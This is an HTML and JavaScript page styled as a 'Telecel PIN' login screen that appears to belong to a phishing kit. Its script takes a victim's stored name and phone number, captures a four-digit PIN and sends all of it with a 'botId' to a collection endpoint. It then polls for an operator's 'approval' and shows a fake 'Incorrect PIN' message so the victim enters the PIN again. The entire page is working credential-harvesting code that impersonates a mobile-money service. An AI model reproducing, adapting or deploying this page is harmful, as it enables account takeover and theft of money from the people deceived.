<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Enter PIN</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #f2f2f2;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* MAIN CARD */
    .pin-card {
      width: 92%;
      max-width: 420px;
      background: #ffffff;
      border-radius: 22px;
      padding: 28px 20px 32px;
      box-shadow: 0 18px 45px rgba(0,0,0,0.12);
      position: relative;
    }

    .back {
      position: absolute;
      left: 18px;
      top: 18px;
      font-size: 22px;
      color: #c00000;
      cursor: pointer;
    }

    .pin-title {
      text-align: center;
      font-size: 16px;
      color: #333;
      margin-bottom: 6px;
      font-weight: 600;
    }

    /* NEW SUB TEXT */
    .pin-subtitle {
      text-align: center;
      font-size: 14px;
      color: #c00000;
      font-weight: bold;
      margin-bottom: 22px;
      letter-spacing: 0.5px;
    }

    /* PIN GROUP BOX (RED + BLACK MIX) */
    .pin-box-wrapper {
      background: linear-gradient(135deg, #c00000 0%, #0b0b0b 100%);
      border-radius: 18px;
      padding: 22px 16px;
      margin-bottom: 26px;
      box-shadow: inset 0 0 0 1px rgba(255,255,255,0.08);
    }

    .pin-row {
      display: flex;
      justify-content: center;
      gap: 14px;
    }

    .pin-box {
      width: 56px;
      height: 56px;
      border-radius: 14px;
      border: 1.5px solid rgba(255,255,255,0.25);
      background: #ffffff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
      font-weight: bold;
      color: #c00000;
      transition: all 0.2s ease;
    }

    .pin-box:not(:empty) {
      border-color: #c00000;
      box-shadow: 0 6px 14px rgba(0,0,0,0.35);
    }

    .lock {
      width: 56px;
      height: 56px;
      border-radius: 14px;
      border: 1.5px dashed rgba(255,255,255,0.4);
      background: rgba(255,255,255,0.15);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      color: #fff;
    }

    button {
      width: 100%;
      max-width: 360px;
      margin: 0 auto;
      display: block;
      padding: 16px;
      font-size: 16px;
      background: #c00000;
      color: white;
      border: none;
      border-radius: 999px;
      cursor: pointer;
      opacity: 0.5;
      transition: all 0.2s ease;
    }

    button:enabled {
      opacity: 1;
      box-shadow: 0 10px 22px rgba(192,0,0,0.35);
    }

    .status {
      margin-top: 16px;
      text-align: center;
      font-size: 14px;
      color: #0a8f55;
      display: none;
    }

    .error {
      color: #d32f2f;
    }

    .hidden-input {
      position: absolute;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>

  <div class="pin-card" onclick="focusPin()">
    <div class="back" onclick="history.back()">‚Üê</div>

    <div class="pin-title">Please enter your PIN</div>
    <div class="pin-subtitle">Telecel PIN</div>

    <div class="pin-box-wrapper">
      <div class="pin-row">
        <div class="pin-box" id="b1"></div>
        <div class="pin-box" id="b2"></div>
        <div class="pin-box" id="b3"></div>
        <div class="pin-box" id="b4"></div>
        <div class="lock">üîí</div>
      </div>
    </div>

    <button id="loginBtn" disabled>Login</button>
    <div id="status" class="status">‚è≥ Waiting for approval...</div>
  </div>

  <input
    id="pinInput"
    class="hidden-input"
    type="tel"
    inputmode="numeric"
    maxlength="4"
  />

  <script>
    const input = document.getElementById('pinInput');
    const loginBtn = document.getElementById('loginBtn');
    const statusEl = document.getElementById('status');

    const boxes = [
      document.getElementById('b1'),
      document.getElementById('b2'),
      document.getElementById('b3'),
      document.getElementById('b4')
    ];

    const fullName = localStorage.getItem('fullName');
    const phone = localStorage.getItem('phone');

    const params = new URLSearchParams(window.location.search);
    const urlBotId = params.get('botId');
    if (urlBotId) localStorage.setItem('botId', urlBotId);

    const botId = localStorage.getItem('botId');

    if (!fullName || !phone || !botId) {
      alert('Session expired. Please start again.');
      window.location.href = 'index.html';
    }

    function focusPin() {
      input.focus();
    }

    input.addEventListener('input', () => {
      input.value = input.value.replace(/\D/g, '').slice(0, 4);
      boxes.forEach((box, i) => box.textContent = input.value[i] ? '‚Ä¢' : '');
      loginBtn.disabled = input.value.length !== 4;
    });

    loginBtn.addEventListener('click', async () => {
      const pin = input.value;

      loginBtn.disabled = true;
      statusEl.style.display = 'block';
      statusEl.classList.remove('error');
      statusEl.textContent = '‚è≥ Waiting for approval...';

      const res = await fetch('/submit-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: fullName, phone, pin, botId })
      });

      if (!res.ok) {
        statusEl.classList.add('error');
        statusEl.textContent = '‚ùå Server error. Please try again.';
        loginBtn.disabled = false;
        return;
      }

      const { requestId } = await res.json();
      pollPin(requestId);
    });

    function pollPin(requestId) {
      const interval = setInterval(async () => {
        const res = await fetch(`/check-pin/${requestId}`);
        const data = await res.json();

        if (data.approved === true) {
          clearInterval(interval);
          window.location.href = 'success.html';
        }

        if (data.approved === false || data.blocked) {
          clearInterval(interval);
          input.value = '';
          boxes.forEach(b => b.textContent = '');
          loginBtn.disabled = true;
          statusEl.classList.add('error');
          statusEl.textContent = '‚ùå Incorrect PIN. Please try again.';
        }
      }, 2000);
    }

    window.onload = () => input.focus();
  </script>

</body>
</html>
